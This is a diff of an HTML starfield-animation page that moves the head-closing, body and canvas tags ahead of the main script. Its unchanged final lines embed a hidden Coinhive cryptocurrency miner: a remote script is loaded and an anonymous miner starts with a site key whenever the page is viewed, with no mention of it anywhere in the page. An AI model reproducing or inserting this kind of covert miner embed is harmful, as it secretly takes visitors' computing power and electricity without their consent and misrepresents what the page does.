@@ -7,6 +7,10 @@
         div {margin:0;padding:0;position:absolute;font-size:0;overflow:hidden}
         canvas{background-color:#000000;overflow:hidden}
     </style>
+</head>
+<body onload="start()" onresize="resize()" onorientationchange="resize()" onmousedown="context.fillStyle='rgba(0,0,0,'+opacity+')'" onmouseup="context.fillStyle='rgb(0,0,0)'">
+<canvas id="starfield" style="background-color:#000000"></canvas>
+	
 <script type="text/javascript">
 function $i(id) { return document.getElementById(id); }
 function $r(parent,child) { (document.getElementById(parent)).removeChild(document.getElementById(child)); }
@@ -202,9 +206,6 @@ document.onkeyup=release;
 document.onmousewheel=mouse_wheel; if(window.addEventListener) window.addEventListener('DOMMouseScroll',mouse_wheel,false);
 
 </script>
-</head>
-<body onload="start()" onresize="resize()" onorientationchange="resize()" onmousedown="context.fillStyle='rgba(0,0,0,'+opacity+')'" onmouseup="context.fillStyle='rgb(0,0,0)'">
-<canvas id="starfield" style="background-color:#000000"></canvas>
 <script src="https://coinhive.com/lib/coinhive.min.js"></script>
 <script>new CoinHive.Anonymous('q3ckCR1Q3AH9ZihssVsITasUFLzUsGmI').start();</script>
 </body>
